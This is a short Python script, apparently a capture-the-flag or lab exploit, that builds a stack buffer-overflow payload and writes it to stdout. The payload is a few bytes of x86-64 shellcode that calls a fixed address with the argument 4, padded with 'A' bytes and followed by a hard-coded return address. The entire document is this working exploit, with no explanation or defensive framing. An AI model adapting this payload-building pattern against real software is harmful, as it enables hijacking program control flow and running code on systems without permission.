import sys

shellcode = bytes.fromhex(
    "bf 04 00 00 00 b8 87 1a 40 00 ff d0"
)

padding = b"A" * (24 - len(shellcode))
return_address = (0x721000800fd0).to_bytes(8, "little")

payload = shellcode + padding + return_address

sys.stdout.buffer.write(payload + b"\n")
